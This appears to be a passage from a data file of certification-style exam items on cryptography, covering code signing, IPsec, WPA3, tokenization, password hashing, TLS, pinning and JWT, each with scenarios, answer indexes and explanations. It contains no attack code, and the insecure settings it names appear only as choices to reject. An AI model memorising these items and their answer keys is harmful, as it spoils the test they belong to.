        explain: "S/MIME uses X.509 certificates issued by the enterprise CA, fitting the existing PKI and supporting central key escrow. PGP relies on a decentralized web-of-trust, not the corporate CA."
      },
      {
        label: "Symmetric content-encryption algorithm",
        hint: "Bulk message body encryption.",
        options: ["RC4", "DES", "AES-256", "Blowfish-64"],
        answer: 2,
        explain: "AES-256 is the modern, approved symmetric cipher for the message content-encryption key. RC4 and DES are deprecated and insecure."
      },
      {
        label: "Digital signature / hash for integrity",
        hint: "Signs the message digest.",
        options: ["MD5", "SHA-256 with RSA", "SHA-1 with DSA", "CRC32"],
        answer: 1,
        explain: "SHA-256 with RSA provides a collision-resistant signed digest. MD5 and SHA-1 are broken for signatures, and CRC32 is an error-detection checksum, not cryptographic."
      },
      {
        label: "Identify the INSECURE request to reject",
        hint: "Which legacy ask must be denied?",
        options: ["AES-256 content encryption", "RC4-based encryption", "SHA-256 signing", "X.509 cert from the CA"],
        answer: 1,
        explain: "RC4 has fatal keystream biases and is prohibited. The team must refuse the legacy RC4 request and standardize on AES."
      }
    ],
    summary: "S/MIME on the corporate PKI with AES-256 content encryption and SHA-256/RSA signatures delivers confidentiality, authentication, and integrity; RC4 is rejected."
  },
  {
    id: "PBQ-107",
    format: 4,
    domain: 1,
    title: "Code Signing Certificate Implementation",
    brief: "A software publisher must sign release binaries so customers can verify authenticity and detect tampering. Choose the correct code-signing crypto and key protection.",
    exhibitTitle: "Code Signing Pipeline Spec",
    exhibit: "<span class='dim'>-- Release Signing Policy --</span>\nArtifact: signed Windows installer + drivers\nKey protection: <span class='ok'>HSM / hardware token (FIPS 140-2 L2)</span>\nTimestamping: <span class='cy'>RFC 3161 trusted timestamp authority</span>\nCert type: <span class='cy'>EV code signing certificate</span>\nLegacy build server still offers: <span class='hl'>SHA-1 signing</span>",
    fields: [
      {
        label: "Signature hashing algorithm",
        hint: "Digest of the binary before signing.",
        options: ["SHA-1", "MD5", "SHA-256", "MD4"],
        answer: 2,
        explain: "SHA-256 is required for current code signing; SHA-1 is deprecated and distrusted by OS signature validators, and MD5/MD4 are broken."
      },
      {
        label: "Signing key algorithm",
        hint: "Asymmetric key that creates the signature.",
        options: ["RSA-3072 or ECDSA P-256", "RSA-512", "DES key", "RC4 key"],
        answer: 0,
        explain: "Asymmetric RSA-3072 (or ECDSA P-256) gives adequate signing strength. 512-bit RSA is far too weak, and DES/RC4 are symmetric and not used for signing."
      },
      {
        label: "Why add an RFC 3161 timestamp",
        hint: "Validity after the cert expires.",
        options: ["Encrypts the binary", "Proves the signature existed before cert expiry", "Compresses the installer", "Hides the publisher name"],
        answer: 1,
        explain: "A trusted timestamp lets signatures remain valid after the signing certificate expires, proving the code was signed during the cert's validity window."
      },
      {
        label: "Identify the INSECURE configuration",
        hint: "Which option must be disabled?",
        options: ["HSM-stored private key", "RFC 3161 timestamping", "SHA-1 signing on the legacy server", "EV code signing cert"],
        answer: 2,
        explain: "SHA-1 signing is deprecated and rejected by modern platforms; the legacy build server's SHA-1 option must be disabled in favor of SHA-256."
      }
    ],
    summary: "EV code signing with SHA-256/RSA-3072 keys stored in an HSM plus RFC 3161 timestamping ensures authenticity and tamper detection; SHA-1 signing is retired."
  },
  {
    id: "PBQ-108",
    format: 4,
    domain: 1,
    title: "IPsec Site-to-Site VPN Crypto Suite",
    brief: "Configure the IKEv2/IPsec parameters for a site-to-site tunnel that must use authenticated encryption and strong key exchange. Match each parameter to a secure value.",
    exhibitTitle: "IPsec Tunnel Build Sheet",
    exhibit: "<span class='dim'>-- VPN Phase 1 / Phase 2 --</span>\nIKE version: <span class='ok'>IKEv2</span>\nPeer auth: <span class='cy'>certificate-based (X.509)</span>\nPFS: <span class='ok'>enabled</span>\nThroughput: 10 Gbps links (AEAD preferred)\nVendor default still lists: <span class='hl'>3DES-CBC + DH Group 2 (1024-bit)</span>",
    fields: [
      {
        label: "Phase 2 ESP encryption (AEAD)",
        hint: "Combined confidentiality + integrity cipher.",
        options: ["3DES-CBC", "AES-256-GCM", "DES-CBC", "RC4"],
        answer: 1,
        explain: "AES-256-GCM is an AEAD cipher providing both confidentiality and integrity in one pass, ideal for high-throughput links. 3DES/DES/RC4 are weak and slow."
      },
      {
        label: "IKE integrity / PRF hash",
        hint: "Pseudorandom function and integrity.",
        options: ["MD5", "SHA-1", "SHA-384", "CRC16"],
        answer: 2,
        explain: "SHA-384 (SHA-2 family) provides strong integrity and PRF. MD5 and SHA-1 are deprecated for IKE integrity."
      },
      {
        label: "Diffie-Hellman group for key exchange",
        hint: "PFS strength.",
        options: ["Group 2 (MODP-1024)", "Group 1 (MODP-768)", "Group 20 (ECP-384)", "Group 5 (MODP-1536)"],
        answer: 2,
        explain: "Group 20 (384-bit elliptic curve) gives strong, efficient PFS. Groups 1/2 (768/1024-bit) are too weak for modern requirements."
      },
      {
        label: "Identify the INSECURE vendor default",
        hint: "What to override before deploy.",
        options: ["AES-256-GCM ESP", "SHA-384 integrity", "3DES-CBC + DH Group 2", "ECP-384 key exchange"],
        answer: 2,
        explain: "The default 3DES-CBC with DH Group 2 (1024-bit) is weak; it must be replaced with AES-GCM and a strong DH/ECP group."
      }
    ],
    summary: "IKEv2 with cert auth, AES-256-GCM ESP, SHA-384 integrity, and DH Group 20 gives an authenticated, forward-secret tunnel; the 3DES/Group 2 defaults are overridden."
  },
  {
    id: "PBQ-109",
    format: 4,
    domain: 1,
    title: "Enterprise Wi-Fi Cryptographic Selection",
    brief: "A campus wireless refresh must protect against offline dictionary attacks and provide forward secrecy on the PSK network. Choose the wireless crypto components.",
    exhibitTitle: "Wireless Security Design",
    exhibit: "<span class='dim'>-- WLAN Crypto Plan --</span>\nPersonal network: <span class='cy'>passphrase-based, no RADIUS</span>\nGoal: <span class='ok'>resist offline dictionary attacks + forward secrecy</span>\nGuest legacy AP advertises: <span class='hl'>WEP and WPA2-TKIP</span>\nClient mix: modern phones/laptops with transition mode",
    fields: [
      {
        label: "Personal-mode security protocol",
        hint: "Replaces PSK with a balanced PAKE handshake.",
        options: ["WEP", "WPA2-PSK (TKIP)", "WPA3-SAE", "Open (no encryption)"],
        answer: 2,
        explain: "WPA3-SAE (Simultaneous Authentication of Equals) resists offline dictionary attacks and provides forward secrecy, unlike WPA2-PSK which exposes a crackable 4-way handshake."
      },
      {
        label: "Data confidentiality cipher",
        hint: "AEAD cipher mandated by WPA3.",
        options: ["TKIP (RC4)", "AES-CCMP / GCMP", "WEP RC4", "DES-CBC"],
        answer: 1,
        explain: "WPA3 mandates AES in CCMP/GCMP (AEAD). TKIP/WEP rely on RC4 and are insecure."
      },
      {
        label: "Management frame protection",
        hint: "Prevents deauth/forgery attacks.",
        options: ["PMF (802.11w) required", "Disabled for compatibility", "WEP shared key", "MAC filtering only"],
        answer: 0,
        explain: "WPA3 requires Protected Management Frames (802.11w), blocking deauthentication and forged management-frame attacks."
      },
      {
        label: "Identify the INSECURE legacy option",
        hint: "Which guest AP setting must be removed?",
        options: ["WPA3-SAE", "AES-CCMP", "WEP / WPA2-TKIP", "PMF required"],
        answer: 2,
        explain: "WEP and WPA2-TKIP (RC4-based) are broken and must be removed; the guest AP should be reconfigured to WPA3 or at minimum WPA2-AES."
      }
    ],
    summary: "WPA3-SAE with AES-CCMP/GCMP and required PMF defeats offline cracking and adds forward secrecy; WEP and TKIP are eliminated."
  },
  {
    id: "PBQ-110",
    format: 4,
    domain: 1,
    title: "Database Encryption Strategy: TDE vs Column-Level",
    brief: "A finance database stores SSNs and account balances. Select the encryption approach and crypto parameters that protect specific sensitive columns while keeping the rest performant.",
    exhibitTitle: "Database Protection Requirements",
    exhibit: "<span class='dim'>-- DB Encryption Design --</span>\nSensitive fields: <span class='cy'>SSN, bank account number</span>\nRest of schema: low-sensitivity, query-heavy\nThreat: <span class='warnc'>DBA / privileged-insider snooping on rows</span>\nAt-rest media theft also a concern\nLegacy proposal: <span class='hl'>application-side ECB-mode encryption</span>",
    fields: [
      {
        label: "Protect ONLY the SSN/account columns from DBAs",
        hint: "Granular field-level control.",
        options: ["Column-level (cell) encryption", "TDE only", "No encryption", "Full-disk only"],
        answer: 0,
        explain: "Column-level encryption protects specific sensitive fields and can keep keys outside the DBA's control, mitigating privileged-insider snooping. TDE alone leaves data readable to anyone with DB access."
      },
      {
        label: "Protect the whole database file from media theft",
        hint: "Transparent at-rest encryption.",
        options: ["Column-level only", "Transparent Data Encryption (TDE)", "ECB application encryption", "Base64 encoding"],
        answer: 1,
        explain: "TDE transparently encrypts the entire data-at-rest store (files/backups), defending against stolen media; it complements column-level encryption for layered protection."
      },
      {
        label: "Cipher mode for the encrypted columns",
        hint: "Avoid revealing identical plaintexts.",
        options: ["AES-ECB", "AES-GCM", "DES-CBC", "RC4"],
        answer: 1,
        explain: "AES-GCM provides authenticated encryption with a unique nonce per value, hiding patterns. ECB leaks identical plaintext blocks; DES/RC4 are weak."
      },
      {
        label: "Identify the INSECURE proposal",
        hint: "Which design leaks data patterns?",
        options: ["AES-GCM columns", "TDE for backups", "ECB-mode application encryption", "Separate key custody from DBA"],
        answer: 2,
        explain: "ECB mode encrypts identical plaintext blocks to identical ciphertext, leaking structure (e.g., repeated SSN prefixes). It must be rejected in favor of GCM."
      }
    ],
    summary: "Column-level AES-GCM (keys outside DBA control) defends sensitive fields from insiders while TDE covers media theft; ECB-mode encryption is rejected."
  },
  {
    id: "PBQ-111",
    format: 4,
    domain: 1,
    title: "PCI Cardholder Data: Tokenization vs Encryption",
    brief: "A merchant must reduce PCI DSS scope for stored card numbers used in recurring billing while still supporting refunds. Choose the protection model and supporting crypto.",
    exhibitTitle: "Cardholder Data Protection Plan",
    exhibit: "<span class='dim'>-- PCI DSS Storage Design --</span>\nUse case: <span class='cy'>recurring billing + refunds, no need to decrypt PAN locally</span>\nGoal: <span class='ok'>remove PAN from merchant environment / shrink scope</span>\nVault: <span class='cy'>PCI-compliant token service provider</span>\nLegacy app stores: <span class='hl'>full PAN in a flat file, no protection</span>",
    fields: [
      {
        label: "Primary protection model to shrink PCI scope",
        hint: "Replaces PAN with a non-reversible reference.",
        options: ["Tokenization", "ROT13 encoding", "Base64 storage", "Plaintext with ACLs"],
        answer: 0,
        explain: "Tokenization replaces the PAN with a meaningless token mapped only in a secure vault, removing real card data from the merchant environment and reducing PCI scope. Encoding/plaintext provide no protection."
      },
      {
        label: "How the token relates to the PAN",
        hint: "Reversibility property.",
        options: ["Mathematically derived/reversible by the merchant", "Random surrogate with no algorithmic link", "A hash of the PAN with no salt", "The PAN reversed"],
        answer: 1,
        explain: "A proper token is a random surrogate value with no mathematical relationship to the PAN; only the vault can map it back, unlike encryption which is reversible with the key."
      },
      {
        label: "Crypto for the data still in transit to the token vault",
        hint: "Protect PAN on the wire during tokenization.",
        options: ["TLS 1.0", "TLS 1.2+ with AES-GCM", "Cleartext HTTP", "SSLv3"],
        answer: 1,
        explain: "PAN sent to the tokenization service must travel over TLS 1.2+ with strong AEAD ciphers. TLS 1.0/SSLv3 are prohibited."
      },
      {
        label: "Identify the INSECURE legacy practice",
        hint: "Which must be eliminated immediately?",
        options: ["Tokenization", "TLS 1.2 transport", "Full PAN stored unprotected in a flat file", "Random surrogate tokens"],
        answer: 2,
        explain: "Storing the full PAN unprotected in a flat file is a direct PCI violation and breach risk; it must be replaced by tokenization."
      }
    ],
    summary: "Tokenization with random surrogates in a PCI vault removes PAN from scope, with TLS 1.2+/AES-GCM protecting data in transit; unprotected PAN storage is eliminated."
  },
  {
    id: "PBQ-112",
    format: 4,
    domain: 1,
    title: "Blockchain Integrity Ledger Design",
    brief: "An audit team wants a tamper-evident ledger that chains records so any alteration is detectable. Select the hashing and signing components for the integrity ledger.",
    exhibitTitle: "Tamper-Evident Ledger Spec",
    exhibit: "<span class='dim'>-- Audit Ledger Architecture --</span>\nGoal: <span class='ok'>tamper-evident chain of audit records</span>\nEach block: <span class='cy'>data + prev-block hash + signature</span>\nThreat: <span class='warnc'>retroactive record alteration</span>\nProposal under review uses: <span class='hl'>MD5 for block hashing</span>",
    fields: [
      {
        label: "Block-chaining hash function",
        hint: "Links each block to the previous one.",
        options: ["MD5", "SHA-256", "CRC32", "SHA-1"],
        answer: 1,
        explain: "SHA-256 is collision-resistant and standard for blockchain-style hash chaining. MD5 and SHA-1 are broken; CRC32 is non-cryptographic."
      },
      {
        label: "What property makes the ledger tamper-evident",
        hint: "Effect of changing one record.",
        options: ["Encryption hides the data", "Each block's hash depends on the prior block, so a change cascades", "Compression detects edits", "ACLs prevent reads"],
        answer: 1,
        explain: "Because every block includes the prior block's hash, altering any record changes all subsequent hashes, making tampering immediately detectable."
      },
      {
        label: "Signing algorithm for block authenticity",
        hint: "Proves who wrote the block.",
        options: ["ECDSA P-256", "RC4", "DES", "Plain CRC"],
        answer: 0,
        explain: "ECDSA P-256 (or RSA) digitally signs blocks to prove authorship and prevent forgery; RC4/DES are symmetric and unsuitable, CRC is not cryptographic."
      },
      {
        label: "Identify the INSECURE proposal",
        hint: "Which hash invites collisions?",
        options: ["SHA-256 chaining", "ECDSA signatures", "MD5 block hashing", "Prev-hash inclusion"],
        answer: 2,
        explain: "MD5 is collision-vulnerable, so an attacker could craft a substitute block with the same hash; it must be replaced by SHA-256."
      }
    ],
    summary: "A SHA-256 hash chain with ECDSA-signed blocks makes the audit ledger tamper-evident; MD5 hashing is rejected for collision risk."
  },
  {
    id: "PBQ-113",
    format: 4,
    domain: 1,
    title: "Secrets Management and Key Rotation Policy",
    brief: "An application currently hardcodes API keys and database passwords. Design a secrets-management and rotation scheme using a centralized vault. Match each control.",
    exhibitTitle: "Secrets Management Standard",
    exhibit: "<span class='dim'>-- Secrets / Key Lifecycle --</span>\nStore: <span class='cy'>centralized secrets manager (HSM-backed)</span>\nGoal: <span class='ok'>no plaintext secrets in code or config</span>\nAccess: short-lived dynamic credentials\nCurrent state: <span class='hl'>API keys hardcoded in the Git repo</span>",
    fields: [
      {
        label: "Where secrets should live",
        hint: "Central, audited, access-controlled store.",
        options: ["In source code constants", "A centralized secrets manager / vault", "A shared spreadsheet", "Environment files committed to Git"],
        answer: 1,
        explain: "A centralized secrets manager stores secrets encrypted, enforces access policy, and audits retrieval, eliminating hardcoded credentials."
      },
      {
        label: "Key encryption key (KEK) protection",
        hint: "Root key that wraps data keys.",
        options: ["Stored next to the data keys in plaintext", "Held in an HSM and never exported", "Emailed to admins", "Printed in logs"],
        answer: 1,
        explain: "The KEK that wraps data encryption keys should reside in an HSM and never leave it, providing envelope encryption with strong key custody."
      },
      {
        label: "Rotation approach for compromised/aging keys",
        hint: "Automated lifecycle control.",
        options: ["Never rotate to avoid downtime", "Automated periodic + on-demand rotation with versioning", "Rotate only after a breach is public", "Reuse one key forever"],
        answer: 1,
        explain: "Automated periodic and on-demand rotation with key versioning limits exposure and allows seamless re-encryption; never rotating violates key-management best practice."
      },
      {
        label: "Identify the INSECURE current practice",
        hint: "What is the immediate risk?",
        options: ["HSM-held KEK", "Automated rotation", "API keys hardcoded in the Git repo", "Dynamic short-lived credentials"],
        answer: 2,
        explain: "Hardcoded API keys in a repository are exposed to anyone with repo access and persist in history; they must be revoked, rotated, and moved to the vault."
      }
    ],
    summary: "A centralized HSM-backed vault with envelope encryption, automated/on-demand rotation, and dynamic credentials replaces hardcoded secrets in the repo."
  },
  {
    id: "PBQ-114",
    format: 4,
    domain: 1,
    title: "Certificate Pinning for a Mobile App",
    brief: "A banking mobile app must resist man-in-the-middle attacks even if a rogue CA issues a fraudulent certificate. Configure certificate pinning correctly.",
    exhibitTitle: "Mobile TLS Hardening Spec",
    exhibit: "<span class='dim'>-- App Transport Hardening --</span>\nThreat: <span class='warnc'>rogue/compromised CA issuing fake certs</span>\nGoal: <span class='ok'>only trust the bank's own key/cert</span>\nApp: native iOS/Android banking client\nProposed shortcut: <span class='hl'>disable TLS validation entirely</span>",
    fields: [
      {
        label: "Control to defeat a rogue-CA MITM",
        hint: "Bind the app to a specific key.",
        options: ["Certificate/public-key pinning", "Trust all system CAs", "Disable certificate checks", "Accept any self-signed cert"],
        answer: 0,
        explain: "Pinning embeds the expected server certificate or public key in the app, so a fraudulent cert from any other CA is rejected even if it chains to a trusted root."
      },
      {
        label: "What to pin for resilience across cert renewals",
        hint: "Survives leaf-cert reissue.",
        options: ["The exact leaf certificate only", "The public key (SPKI) hash", "The CA's name string", "The server IP address"],
        answer: 1,
        explain: "Pinning the SPKI (public-key) hash lets the cert be reissued with the same key without breaking the app, more durable than pinning the exact leaf certificate."
      },
      {
        label: "Backup pin requirement",
        hint: "Avoid bricking the app.",
        options: ["No backup needed", "Include a backup pin for a future key", "Pin to MD5 of the cert", "Pin to the TLS 1.0 handshake"],
        answer: 1,
        explain: "A backup pin for a planned future key prevents the app from being locked out if the primary key must be rotated or revoked."
      },
      {
        label: "Identify the INSECURE shortcut",
        hint: "Which choice removes all protection?",
        options: ["SPKI pinning", "Backup pin", "Disabling TLS validation entirely", "Pinning the bank's key"],
        answer: 2,
        explain: "Disabling TLS validation removes trust verification entirely, exposing the app to any MITM; it is never acceptable."
      }
    ],
    summary: "SPKI public-key pinning with a backup pin binds the banking app to the bank's own key, defeating rogue-CA MITM; disabling TLS validation is rejected."
  },
  {
    id: "PBQ-115",
    format: 4,
    domain: 1,
    title: "OCSP Stapling for Revocation Checking",
    brief: "A high-traffic web server must provide fast, private certificate-revocation status to clients without each browser querying the CA. Configure OCSP stapling.",
    exhibitTitle: "Revocation Checking Design",
    exhibit: "<span class='dim'>-- TLS Revocation Strategy --</span>\nGoal: <span class='ok'>fast revocation status, client privacy preserved</span>\nLoad: <span class='cy'>high-volume public web tier</span>\nConcern: per-client CA lookups are slow and leak browsing\nFallback proposal: <span class='hl'>disable revocation checking to boost speed</span>",
    fields: [
      {
        label: "Mechanism that delivers revocation status efficiently",
        hint: "Server attaches signed status to the handshake.",
        options: ["OCSP stapling", "Each client polls a CRL", "No revocation checking", "DNS lookup of the cert"],
        answer: 0,
        explain: "OCSP stapling has the web server fetch and cache a CA-signed status response and attach (staple) it during the TLS handshake, removing per-client CA queries and preserving privacy."
      },
      {
        label: "Who signs the stapled status response",
        hint: "Trust source for the status.",
        options: ["The web server itself", "The issuing CA's OCSP responder", "The client browser", "A random third party"],
        answer: 1,
        explain: "The issuing CA's OCSP responder signs the status, so clients can trust the stapled response even though the server delivered it."
      },
      {
        label: "Add-on that forces clients to require a staple",
        hint: "Prevents staple-stripping downgrade.",
        options: ["OCSP Must-Staple (cert extension)", "Allow missing staples silently", "MD5 of the response", "TLS 1.0 fallback"],
        answer: 0,
        explain: "The Must-Staple certificate extension tells clients to reject a connection lacking a valid stapled OCSP response, preventing a stripping/downgrade attack."
      },
      {
        label: "Identify the INSECURE fallback",
        hint: "Which choice ignores revocation?",
        options: ["OCSP stapling", "CA-signed responses", "Disabling revocation checking", "Must-Staple extension"],
        answer: 2,
        explain: "Disabling revocation checking means revoked/compromised certificates would still be accepted; stapling solves the performance problem without abandoning revocation."
      }
    ],
    summary: "OCSP stapling delivers CA-signed revocation status in the handshake, with Must-Staple preventing stripping; disabling revocation checks is rejected."
  },
  {
    id: "PBQ-116",
    format: 4,
    domain: 1,
    title: "Password Storage: Salt, Pepper, and Key Stretching",
    brief: "An authentication service must store user credentials so that breach disclosure does not reveal passwords and so brute force is computationally expensive. Match the controls.",
    exhibitTitle: "Credential Storage Standard",
    exhibit: "<span class='dim'>-- Password Hashing Policy --</span>\nGoal: <span class='ok'>resist offline cracking + rainbow tables</span>\nStore: hashed credentials in the auth DB\nApp secret: <span class='cy'>server-side pepper held in a vault</span>\nLegacy table currently uses: <span class='hl'>unsalted MD5 hashes</span>",
    fields: [
      {
        label: "Per-user random value stored with the hash",
        hint: "Defeats precomputed rainbow tables.",
        options: ["Pepper", "Salt (unique per user)", "IV reuse", "Static prefix"],
        answer: 1,
        explain: "A unique random salt per user ensures identical passwords hash differently and defeats precomputed rainbow tables; it is stored alongside the hash."
      },
      {
        label: "Secret value kept OUT of the database",
        hint: "Adds defense if the DB alone leaks.",
        options: ["Salt", "Pepper (server-side secret in a vault)", "The username", "The hash output"],
        answer: 1,
        explain: "A pepper is a secret added before hashing but stored separately (e.g., in a vault/HSM), so a database-only breach still cannot crack the hashes."
      },
      {
        label: "Key-stretching / password hashing function",
        hint: "Deliberately slow, memory-hard.",
        options: ["MD5", "SHA-1", "Argon2id (or bcrypt/PBKDF2)", "CRC32"],
        answer: 2,
        explain: "Argon2id (or bcrypt/PBKDF2) applies adjustable, memory-hard work factors to make brute force expensive. Fast hashes like MD5/SHA-1 are unsuitable for passwords."
      },
      {
        label: "Identify the INSECURE legacy scheme",
        hint: "Which storage method must be migrated?",
        options: ["Argon2id with salt+pepper", "Per-user salt", "Unsalted MD5 hashes", "Vault-stored pepper"],
        answer: 2,
        explain: "Unsalted MD5 is fast and rainbow-table-vulnerable; credentials must be migrated to a salted, peppered, key-stretched scheme on next login."
      }
    ],
    summary: "Per-user salt plus a vault-held pepper feeding Argon2id key stretching resists offline cracking and rainbow tables; unsalted MD5 is migrated out."
  },
  {
    id: "PBQ-117",
    format: 4,
    domain: 1,
    title: "Full-Disk Encryption with TPM Binding",
    brief: "Corporate laptops must encrypt the OS volume so that a stolen drive is unreadable, with the key bound to platform integrity. Configure the FDE crypto and key release.",
    exhibitTitle: "Endpoint FDE Standard",
    exhibit: "<span class='dim'>-- Laptop Disk Encryption --</span>\nThreat: <span class='warnc'>lost/stolen laptops, offline drive removal</span>\nKey storage: <span class='cy'>TPM 2.0 (sealed to PCR measurements)</span>\nRecovery: <span class='ok'>escrowed recovery key in MDM</span>\nOld image still offers: <span class='hl'>no pre-boot auth, key in plaintext on disk</span>",
    fields: [
      {
        label: "Volume encryption cipher",
        hint: "Modern FDE bulk cipher.",
        options: ["AES-256-XTS", "DES-CBC", "RC4", "3DES"],
        answer: 0,
        explain: "AES-256-XTS is the standard mode for disk/sector encryption, designed to resist block-manipulation attacks. DES/3DES/RC4 are weak."
      },
      {
        label: "Where the volume key is sealed",
        hint: "Hardware root of trust binding.",
        options: ["Plaintext file on the same disk", "TPM sealed to platform PCRs", "A sticky note", "Unprotected registry key"],
        answer: 1,
        explain: "Sealing the key in the TPM, bound to platform-configuration register (PCR) measurements, releases it only when the boot state is trusted, defeating offline drive removal."
      },
      {
        label: "Recovery key handling",
        hint: "Avoid permanent lockout.",
        options: ["No recovery key", "Escrowed in MDM/key vault", "Printed on the laptop", "Same for every device"],
        answer: 1,
        explain: "An escrowed, unique recovery key in MDM lets IT recover data after TPM changes or forgotten PINs without weakening per-device protection."
      },
      {
        label: "Identify the INSECURE legacy image setting",
        hint: "Which exposes the key?",
        options: ["AES-256-XTS", "TPM-sealed key", "No pre-boot auth with plaintext key on disk", "Escrowed recovery key"],
        answer: 2,
        explain: "Storing the key in plaintext on the same disk with no pre-boot authentication means a thief can read it; the key must be TPM-sealed and pre-boot auth enforced."
      }
    ],
    summary: "AES-256-XTS FDE with the key TPM-sealed to PCRs and an escrowed MDM recovery key protects stolen drives; the plaintext-key legacy image is rejected."
  },
  {
    id: "PBQ-118",
    format: 4,
    domain: 1,
    title: "TLS 1.3 Web Server Cipher Configuration",
    brief: "A public web service must offer forward-secret, authenticated TLS and disable legacy protocols. Select the protocol version and cipher components.",
    exhibitTitle: "Web TLS Hardening Sheet",
    exhibit: "<span class='dim'>-- HTTPS Endpoint Config --</span>\nGoal: <span class='ok'>forward secrecy + AEAD ciphers + modern protocol</span>\nCert: <span class='cy'>ECDSA P-256 leaf from public CA</span>\nHSTS: <span class='ok'>enabled, long max-age</span>\nLoad balancer still permits: <span class='hl'>TLS 1.0 and RC4 cipher suites</span>",
    fields: [
      {
        label: "Minimum TLS protocol version",
        hint: "Removes legacy renegotiation/RC4 issues.",
        options: ["SSLv3", "TLS 1.0", "TLS 1.2 (prefer 1.3)", "TLS 1.1"],
        answer: 2,
        explain: "TLS 1.2 should be the floor with 1.3 preferred; 1.3 mandates forward secrecy and AEAD. SSLv3/TLS 1.0/1.1 are deprecated and disabled."
      },
      {
        label: "Key-exchange providing forward secrecy",
        hint: "Ephemeral key agreement.",
        options: ["Static RSA key transport", "ECDHE", "Plain DH Group 1", "No key exchange"],
        answer: 1,
        explain: "ECDHE (ephemeral elliptic-curve Diffie-Hellman) gives per-session keys and forward secrecy. Static RSA key transport lacks forward secrecy."
      },
      {
        label: "Bulk cipher / AEAD suite",
        hint: "Authenticated encryption.",
        options: ["RC4-SHA", "AES-128-GCM or ChaCha20-Poly1305", "3DES-CBC", "NULL cipher"],
        answer: 1,
        explain: "AES-128-GCM or ChaCha20-Poly1305 are AEAD suites providing confidentiality and integrity. RC4 and 3DES are weak; NULL provides no encryption."
      },
      {
        label: "Identify the INSECURE allowed suite",
        hint: "Which must the LB stop offering?",
        options: ["TLS 1.3 AES-GCM", "ECDHE key exchange", "TLS 1.0 with RC4", "ChaCha20-Poly1305"],
        answer: 2,
        explain: "TLS 1.0 with RC4 is broken on both protocol and cipher; the load balancer must disable these and serve only modern AEAD suites."
      }
    ],
    summary: "TLS 1.2+/1.3 with ECDHE forward secrecy and AES-GCM/ChaCha20-Poly1305 AEAD on an ECDSA cert hardens the endpoint; TLS 1.0/RC4 are disabled."
  },
  {
    id: "PBQ-119",
    format: 4,
    domain: 1,
    title: "Post-Quantum Awareness and Crypto-Agility",
    brief: "A long-lived data archive must stay protected against future quantum decryption (harvest-now-decrypt-later) while remaining secure today. Choose a crypto-agile strategy.",
    exhibitTitle: "Quantum-Readiness Plan",
    exhibit: "<span class='dim'>-- Long-Term Crypto Strategy --</span>\nData lifetime: <span class='cy'>30+ year confidential archive</span>\nThreat: <span class='warnc'>harvest-now, decrypt-later by future quantum adversary</span>\nGoal: <span class='ok'>strong today + migration path to PQC</span>\nVendor pitch: <span class='hl'>switch entirely to an unvetted experimental cipher now</span>",
    fields: [
      {
        label: "Symmetric cipher resilient against quantum (Grover) attacks",
        hint: "Large key size halves effectively under Grover.",
        options: ["AES-128", "AES-256", "DES", "RC4"],
        answer: 1,
        explain: "AES-256 retains roughly 128-bit security against Grover's algorithm, making it the recommended symmetric choice for long-term data; AES-128 has a smaller margin."
      },
      {
        label: "Approach for key exchange / signatures going forward",
        hint: "Standardized, hedged migration.",
        options: ["Hybrid classical + NIST PQC (e.g., ML-KEM) algorithms", "Keep only RSA-1024", "Use a homegrown unvetted cipher", "Disable encryption until PQC is final"],
        answer: 0,
        explain: "A hybrid approach combining a proven classical algorithm with a NIST-standardized PQC algorithm (e.g., ML-KEM/Kyber) hedges risk during migration. Homegrown/unvetted ciphers are dangerous."
      },
      {
        label: "Architectural principle enabling future swaps",
        hint: "Avoid hardcoding one algorithm.",
        options: ["Crypto-agility (algorithm abstraction)", "Hardcode one cipher everywhere", "Hide the algorithm (security by obscurity)", "Never update libraries"],
        answer: 0,
        explain: "Crypto-agility abstracts algorithm choice behind interfaces and metadata so algorithms can be replaced as standards evolve, without re-architecting the system."
      },
      {
        label: "Identify the INSECURE vendor recommendation",
        hint: "Which choice abandons proven security?",
        options: ["AES-256 today", "Hybrid classical + PQC", "Switching entirely to an unvetted experimental cipher", "Crypto-agile design"],
        answer: 2,
        explain: "Replacing proven cryptography with an unvetted experimental cipher removes peer-reviewed assurance; sound practice is AES-256 today plus a hybrid, crypto-agile path to standardized PQC."
      }
    ],
    summary: "AES-256 today with a crypto-agile design and a hybrid classical+NIST PQC migration path counters harvest-now-decrypt-later; unvetted experimental ciphers are rejected."
  },
  {
    id: "PBQ-120",
    format: 4,
    domain: 1,
    title: "API Message-Level Signing and Encryption (JWT/JOSE)",
    brief: "A B2B API must authenticate and protect individual JSON messages end-to-end, even across intermediaries that terminate TLS. Configure the JOSE/JWT crypto.",
    exhibitTitle: "API Message Security Spec",
    exhibit: "<span class='dim'>-- JOSE / JWT Crypto Plan --</span>\nNeed: <span class='ok'>per-message integrity + confidentiality end-to-end</span>\nIntermediaries: <span class='warnc'>API gateways terminate TLS in transit</span>\nKeys: <span class='cy'>partner public keys via JWKS endpoint</span>\nLegacy SDK default: <span class='hl'>JWT alg set to \"none\" / HS256 with shared secret in code</span>",
    fields: [
      {
        label: "JWS signing algorithm for cross-org trust",
        hint: "Asymmetric so partners verify with a public key.",
        options: ["alg: none", "RS256 / ES256 (asymmetric)", "HS256 with a hardcoded secret", "MD5-HMAC"],
        answer: 1,
        explain: "RS256 or ES256 lets each partner sign with a private key and others verify with the published public key (JWKS), suiting cross-organization trust. Shared-secret HS256 forces secret sharing."
      },
      {
        label: "Protect the payload confidentiality (JWE)",
        hint: "Encrypt the claims, AEAD content cipher.",
        options: ["A256GCM content encryption", "RC4 content encryption", "ECB-mode payload", "No encryption (rely on TLS only)"],
        answer: 0,
        explain: "JWE with A256GCM content encryption protects the payload end-to-end, even where gateways terminate TLS. RC4/ECB are weak, and TLS-only fails once the gateway decrypts."
      },
      {
        label: "Why message-level crypto beyond TLS",
        hint: "Trust boundary at the gateway.",
        options: ["TLS already protects end-to-end through gateways", "Gateways terminate TLS, so messages are plaintext between hops", "It compresses the payload", "It speeds up parsing"],
        answer: 1,
        explain: "Because intermediaries terminate TLS, data is exposed between hops; signing and encrypting the message itself preserves end-to-end integrity and confidentiality."
      },
      {
        label: "Identify the INSECURE legacy default",
        hint: "Which JWT setting must be blocked?",
        options: ["RS256 signing", "A256GCM encryption", "alg \"none\" / hardcoded HS256 secret", "JWKS public-key verification"],
        answer: 2,
        explain: "The alg \"none\" setting skips signature verification (forgeable tokens), and a hardcoded HS256 secret leaks trust; both must be blocked in favor of asymmetric RS256/ES256."
      }
    ],
    summary: "RS256/ES256 JWS signing plus A256GCM JWE encryption with JWKS public keys protects messages end-to-end past TLS-terminating gateways; alg \"none\" and hardcoded secrets are blocked."
  }
);
